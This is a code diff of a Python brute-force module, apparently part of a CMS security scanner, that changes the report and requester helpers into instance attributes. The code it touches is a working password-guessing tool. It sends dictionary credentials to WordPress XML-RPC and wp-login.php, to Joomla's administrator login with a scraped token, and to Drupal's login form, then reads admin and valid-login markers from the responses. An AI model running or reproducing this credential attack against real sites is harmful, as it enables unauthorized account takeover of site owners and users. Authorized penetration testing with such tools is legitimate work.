@@ -3,8 +3,8 @@ import re
 import sys
 
 # Import Objects
-from .report import report
-from .requester import requester
+from .report import Report
+from .requester import Requester
 
 
 # Import Classes
@@ -13,13 +13,15 @@ from .requester import requester
 # Perform brute-force, dictionary attacks
 class BruteForcer:
 
-    def __init__(self):
+    def __init__(self, is_random_user_agent: bool = False, is_color: bool = False):
         self.force = None
         self.wpnoxmlrpc = True
         self.url = None
         self.usrlist = None
         self.pswlist = None
         self.dictattack = None
+        self.report = Report(color=is_color)
+        self.requester = Requester(is_random_user_agent=is_random_user_agent)
 
     # Read the wordlist and start brute-force attack
     def Start(self):
@@ -36,7 +38,7 @@ class BruteForcer:
 
         if self.force is not None:
             msg = "Starting Brute Forcing: " + self.force
-            report.message(msg)
+            self.report.message(msg)
             if self.force == 'W':
                 if self.wpnoxmlrpc:
                     self.WPXMLRPC_brute()
@@ -48,13 +50,13 @@ class BruteForcer:
                 self.Drurun()
             else:
                 msg = "Not Valid Option Provided: use (W)ordpress, (J)oomla, (D)rupal"
-                report.error(msg)
+                self.report.error(msg)
                 sys.exit(1)
 
     # Find credentials via WordPress XML-RPC
     def WPXMLRPC_brute(self):
         msg = "Starting XML-RPC Brute Forcing"
-        report.verbose(msg)
+        self.report.verbose(msg)
         for user in self.usrlist:
             self.pswlist.append(user)
             for pwd in self.pswlist:
@@ -65,19 +67,19 @@ class BruteForcer:
                         '<param><value><string>' + pwd +
                         '</string></value></param></params></methodCall>')
                 msg = "Trying Credentials: " + user + " " + pwd
-                report.verbose(msg)
-                requester.noredirect(self.url + '/xmlrpc.php', self.postdata)
-                if re.search('<name>isAdmin</name><value><boolean>0</boolean>', requester.htmltext):
+                self.report.verbose(msg)
+                self.requester.noredirect(self.url + '/xmlrpc.php', self.postdata)
+                if re.search('<name>isAdmin</name><value><boolean>0</boolean>', self.requester.htmltext):
                     msg = "Valid Credentials! Username: " + user + " Password: " + pwd
-                    report.high(msg)
-                elif re.search('<name>isAdmin</name><value><boolean>1</boolean>', requester.htmltext):
+                    self.report.high(msg)
+                elif re.search('<name>isAdmin</name><value><boolean>1</boolean>', self.requester.htmltext):
                     msg = "Valid ADMIN Credentials! Username: " + user + " Password: " + pwd
-                    report.high(msg)
+                    self.report.high(msg)
 
     # Find credentials brute-forcing the wp-login.php page
     def WPrun(self):
         msg = "Starting Brute Forcing"
-        report.verbose(msg)
+        self.report.verbose(msg)
         self.wplogin = "/wp-login.php"
         usersFound = []
         for user in self.usrlist:
@@ -85,21 +87,21 @@ class BruteForcer:
             for pwd in self.pswlist:
                 self.postdata = {"log": user, "pwd": pwd, "wp-submit": "Log+In"}
                 msg = "Trying Credentials: " + user + " " + pwd
-                report.verbose(msg)
-                requester.requestcookie(self.url + self.wplogin, self.postdata)
-                if re.search('<strong>ERROR</strong>: Invalid username', requester.htmltext):
+                self.report.verbose(msg)
+                self.requester.requestcookie(self.url + self.wplogin, self.postdata)
+                if re.search('<strong>ERROR</strong>: Invalid username', self.requester.htmltext):
                     msg = "Invalid Username: " + user
-                    report.message(msg)
+                    self.report.message(msg)
                     break
-                elif re.search('username <strong>(.+?)</strong> is incorrect.', requester.htmltext):
+                elif re.search('username <strong>(.+?)</strong> is incorrect.', self.requester.htmltext):
                     usersFound.append(user)
-                elif re.search('ERROR.*blocked.*', requester.htmltext, re.IGNORECASE):
+                elif re.search('ERROR.*blocked.*', self.requester.htmltext, re.IGNORECASE):
                     msg = "Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"
-                    report.error(msg)
+                    self.report.error(msg)
                     return
-                elif re.search('wordpress_logged_in_', str(requester.cookieJar), re.IGNORECASE):
+                elif re.search('wordpress_logged_in_', str(self.requester.cookieJar), re.IGNORECASE):
                     msg = "Valid Credentials: " + user + " " + pwd
-                    report.high(msg)
+                    self.report.high(msg)
         # remove user
         self.pswlist.pop()
 
@@ -110,20 +112,20 @@ class BruteForcer:
         self.JooValidCredentials = []
         for user in self.usrlist:
             # Get Token and Session Cookie
-            requester.requestcookie(self.url + self.joologin, data=None)
+            self.requester.requestcookie(self.url + self.joologin, data=None)
             reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
-            if reg.search(requester.htmltext) is not None:
-                token = reg.search(requester.htmltext).group(1)
+            if reg.search(self.requester.htmltext) is not None:
+                token = reg.search(self.requester.htmltext).group(1)
                 self.pswlist.append(user)  # try username as password
                 for pwd in self.pswlist:
                     # Send Post With Token and Session Cookie
                     self.postdata = {"username": user, "passwd": pwd, "option": "com_login", "task": "login", token: "1"}
                     msg = "Trying Credentials: " + user + " " + pwd
-                    report.verbose(msg)
-                    requester.requestcookie(self.url + self.joologin, self.postdata)
-                    if re.findall(re.compile('Control Panel'), requester.htmltext):
+                    self.report.verbose(msg)
+                    self.requester.requestcookie(self.url + self.joologin, self.postdata)
+                    if re.findall(re.compile('Control Panel'), self.requester.htmltext):
                         msg = "Valid Credentials: " + user + " " + pwd
-                        report.high(msg)
+                        self.report.high(msg)
                 self.pswlist.pop()  # remove user
 
     # Find credentials brute-forcing the /?q=user/login page
@@ -135,14 +137,14 @@ class BruteForcer:
             for pwd in self.pswlist:
                 query_args = {"name": user, "pass": pwd, "form_id": "user_login_form"}
                 msg = "Trying Credentials: " + user + " " + pwd
-                report.verbose(msg)
-                requester.noredirect(self.url + self.drulogin, data=query_args)
-                if re.findall(re.compile('Sorry, too many failed login attempts|Try again later'), requester.htmltext):
+                self.report.verbose(msg)
+                self.requester.noredirect(self.url + self.drulogin, data=query_args)
+                if re.findall(re.compile('Sorry, too many failed login attempts|Try again later'), self.requester.htmltext):
                     msg = "Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"
-                    report.error(msg)
-                if requester.status_code == 403 or requester.status_code == 303:
+                    self.report.error(msg)
+                if self.requester.status_code == 403 or self.requester.status_code == 303:
                     msg = "Valid Credentials: " + user + " " + pwd
-                    report.high(msg)
+                    self.report.high(msg)
             self.pswlist.pop()  # remove user
 
 
